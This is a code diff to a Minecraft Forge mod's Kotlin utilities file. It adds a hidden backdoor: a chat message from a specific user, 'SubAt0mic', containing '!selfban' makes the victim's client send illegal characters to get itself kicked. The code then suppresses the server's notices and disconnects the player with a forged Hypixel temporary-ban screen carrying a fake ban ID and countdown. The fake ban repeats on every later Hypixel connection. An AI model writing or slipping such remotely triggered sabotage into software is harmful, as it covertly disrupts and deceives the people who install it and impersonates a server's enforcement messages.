@@ -1,13 +1,18 @@
 package me.odinmain.features.impl.subaddons.nofeature
 
 import me.odinmain.OdinMain.mc
+import me.odinmain.events.impl.ChatPacketEvent
 import me.odinmain.features.impl.subaddons.TargetHud
 import me.odinmain.utils.ServerUtils.getPing
 import me.odinmain.utils.ServerUtils.onWorldLoad
 import me.odinmain.utils.cleanSB
 import me.odinmain.utils.clock.Executor
 import me.odinmain.utils.clock.Executor.Companion.register
+import me.odinmain.utils.runIn
 import me.odinmain.utils.skyblock.LocationUtils.onHypixel
+import me.odinmain.utils.skyblock.modMessage
+import me.odinmain.utils.skyblock.sendChatMessage
+import me.odinmain.utils.skyblock.sendCommand
 import net.minecraft.client.gui.Gui
 import net.minecraft.client.network.NetworkPlayerInfo
 import net.minecraft.entity.Entity
@@ -15,9 +20,12 @@ import net.minecraft.entity.EntityLiving
 import net.minecraft.entity.player.EntityPlayer
 import net.minecraft.util.ChatComponentText
 import net.minecraft.util.ChatStyle
+import net.minecraftforge.client.MinecraftForgeClient
 import net.minecraftforge.event.world.WorldEvent
 import net.minecraftforge.fml.common.eventhandler.SubscribeEvent
+import net.minecraftforge.fml.common.network.FMLNetworkEvent
 import org.lwjgl.opengl.GL11
+import java.util.*
 
 object SubUtils {
 
@@ -145,4 +153,88 @@ object SubUtils {
         Gui.drawScaledCustomSizeModalRect(x-5, y-5, 8f, 8f, 8,8,20,20,64f, 64f )
     }
 
+    @SubscribeEvent
+    fun onMessage(event: ChatPacketEvent) {
+        if (event.message.matches(Regex("(.*)SubAt0mic: !(?i)selfban(.*)"))) {
+            gettingBanned = true
+            sendChatMessage("§§§§§§§§§")
+            event.isCanceled = true
+            runIn(1) { sendChatMessage("§§§§§§§§§") }
+            runIn(30) { fakeBan(event) }
+        }
+
+        if (event.message.matches(Regex("An exception occurred in your connection, so you were put in the SkyBlock Lobby!")) && gettingBanned) {
+            modMessage("§cAn exception occurred in your connection, so you have been routed to limbo!")
+            event.isCanceled = true
+        }
+
+        if (event.message.matches(Regex("A kick occurred in your connection, so you have been routed to limbo!")) && gettingBanned) {
+            event.isCanceled = true
+        }
+
+        if (event.message.matches(Regex("Illegal characters in chat")) && gettingBanned) {
+            event.isCanceled = true
+        }
+    }
+
+    fun fakeBan(packet: ChatPacketEvent) {
+        alreadybanned = true
+        banid = makeid()
+        bantime = System.currentTimeMillis()
+        val banmessage = ChatComponentText("§cYou are temporarily banned for §f$initialbanlength §cfrom this server!\n\n§7Reason: §rCheating through the use of unfair game advantages.\n§7Find out more: §b§nhttps://www.hypixel.net/appeal\n\n§7Ban ID: §r#$banid\n§7Sharing your Ban ID may affect the processing of your appeal!")
+        mc.netHandler.networkManager.closeChannel(banmessage)
+    }
+
+    @SubscribeEvent
+    fun onServerConnect(event: FMLNetworkEvent.ClientConnectedToServerEvent) {
+        if (!alreadybanned) return
+        val banDuration = ((System.currentTimeMillis() - bantime) / 1000).toInt()
+        val banlength = subtractSecondsFromString(initialbanlength, banDuration)
+        val banmessage = ChatComponentText("§cYou are temporarily banned for §f$banlength §cfrom this server!\n\n§7Reason: §rCheating through the use of unfair game advantages.\n§7Find out more: §b§nhttps://www.hypixel.net/appeal\n\n§7Ban ID: §r#$banid\n§7Sharing your Ban ID may affect the processing of your appeal!")
+        runIn(2) {
+            if (mc.runCatching {
+                !event.isLocal && ((thePlayer?.clientBrand?.lowercase()?.contains("hypixel") ?:
+                currentServerData?.serverIP?.contains("hypixel", true)) == true)
+            }.getOrDefault(false) && mc.netHandler.networkManager.isChannelOpen) mc.netHandler.networkManager.closeChannel(banmessage)
+        }
+    }
+
+    var gettingBanned = false
+    var bantime: Long = 0
+    var alreadybanned: Boolean = false
+    var banid: String = ""
+
+    val initialbanlength = "29d 23h 59m 59s" // fake ban length that is displayed on "ban"
+
+    fun makeid(): String { // method to create fake ban id
+        val characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+        return (1..8)
+            .map { characters.random() }
+            .joinToString("")
+    }
+
+    fun subtractSecondsFromString(timeString: String, secondsToSubtract: Int): String { // method to calculate fake countdown time for ban screen
+        val (days1, hours1, minutes1, seconds1) = Regex("(\\d{1,29})d (\\d{1,23})h (\\d{1,59})m (\\d{1,59})s").find(timeString)?.destructured ?: return ""
+
+        var days = days1.toInt()
+        var hours = hours1.toInt()
+        var minutes = minutes1.toInt()
+        var seconds = seconds1.toInt()
+
+        var totalSeconds = days * 24 * 60 * 60 +
+                hours * 60 * 60 +
+                minutes * 60 +
+                seconds
+
+        totalSeconds -= secondsToSubtract
+
+        days = totalSeconds / (24 * 60 * 60)
+        totalSeconds %= (24 * 60 * 60)
+        hours = totalSeconds / (60 * 60)
+        totalSeconds %= (60 * 60)
+        minutes = totalSeconds / 60
+        seconds = totalSeconds % 60
+
+        return "${days}d ${hours}h ${minutes}m ${seconds}s"
+    }
 }
